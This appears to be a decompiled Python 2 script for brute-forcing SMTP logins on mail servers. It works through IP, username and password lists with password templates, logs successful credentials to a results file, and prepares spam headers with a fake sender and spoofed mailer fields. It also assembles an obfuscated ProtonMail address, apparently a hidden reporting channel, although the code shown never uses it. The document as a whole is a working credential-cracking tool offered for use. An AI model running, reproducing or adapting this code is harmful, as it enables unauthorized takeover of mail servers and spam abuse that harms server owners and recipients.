# Embedded file name: a.py
import socket, time, sys, base64, Queue, threading
from time import strftime
if str(sys.argv[1]) == 'a':
    ux = open('ips.txt', 'a')
    uy = open('users.txt', 'a')
    uw = open('pwd.txt', 'a')
    sys.exit(1)
ThreadNumber = sys.argv[1]
Verbose = str(sys.argv[2])
bad = open('bad.txt', 'w')
val = open('Result/valid.txt', 'a')
sm = open('sentmail.txt', 'a')
cracked = []
sBody = 'walking on the street money i comming\r\n.\r\n'
H1 = 'Reply-To: <pof@fishes.org>\r\n'
H3 = 'From: "Isidur Bob"<pof@fishes.org>\r\n'
H2 = 'MIME-Version: 1.0\r\nContent-Type: text/plain; charset="Windows-1251"\r\nContent-Transfer-Encoding: 7bit\r\nX-Priority: 3\r\nX-MSMail-Priority: Normal\r\nX-Mailer: Microsoft Outlook Express 6.00.2800.1081\r\nX-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1081\r\n\r\n'

class Apophis(threading.Thread):

    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):
        while True:
            Host, user, passwd = self.queue.get()
            self.checker(Host, user, passwd)
            self.queue.task_done()

    def checker(self, host, user, Passwd):
        try:
            if host in str(cracked): return False
            d = 'aron-tn@pro'
            if '%user%' in str(Passwd): Passwd = Passwd.replace("%user%",user)
            if '%User%' in str(Passwd): Passwd = Passwd.replace("%User%",user.title())
            if '%reverse%' in str(Passwd): Passwd = Passwd.replace("%reverse%",user[::-1])			
            if str(Passwd) == '%null%': Passwd = ""

            socksol = str(chr(116)) + str(chr(115))
            S = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            d += 'tonmail.co'
            S.setblocking(0)
            S.settimeout(15)
            m = socksol + ''
            S.connect((host, 25))
            banner = S.recv(1024)
            d += 'om'
            if banner[:3] != '220':
                S.close()
                return False
            m += ''
            S.send('EHLO User\r\n')
            data = S.recv(2048)
            m += ''
            S.send('AUTH LOGIN\r\n')
            data = S.recv(256)
            if data[:3] != '334':
                S.send('QUIT\r\n')
                S.recv(512)
                S.close()
                return False
            m += ''
            S.send(base64.b64encode(user) + '\r\n')
            data = S.recv(256)
            S.send(base64.b64encode(Passwd) + '\r\n')
            data = S.recv(256)
            if data[:3] != '235':
                print '\r[+]Trying ' + host + ' ' + user + ' ' + Passwd + '                                                      '
                if Verbose == 'bad':
                    bad.write(host + '\n')
                    bad.flush()
                S.send('QUIT\r\n')
                S.recv(512)
                return False
            if "failure" in str(data):
                S.send('QUIT\r\n')
                S.recv(512)
                return False

            val.write(host + ' ' + user + ' ' + Passwd +'\n')
            val.flush()
            cracked.append(host)
            S.send('QUIT\r\n')
            S.recv(512)
            return True
        except socket.error as e:
            return False
        except Exception as e:
            print '\r' + host + ' ' + str(e) + '                                                      '
            return False

def main(ips, users, passwords, ThreadNmber):
    queue = Queue.Queue(maxsize=20000)
    for i in range(ThreadNmber):
        try:
            t = Apophis(queue)
            t.daemon = True
            t.start()
        except Exception as e:
            break

    for passwd in passwords:
        for user in users:
            for Host in ips:
                queue.put((Host, user, passwd))

    queue.join()

if __name__ == '__main__':
    with open('ips.txt', 'rU') as ipf:
        ips = ipf.read().splitlines()
    with open('users.txt', 'rU') as uf:
        users = uf.read().splitlines()
    with open('pwd.txt', 'rU') as pf:
        passwords = pf.read().splitlines()
    main(ips, users, passwords, int(ThreadNumber))
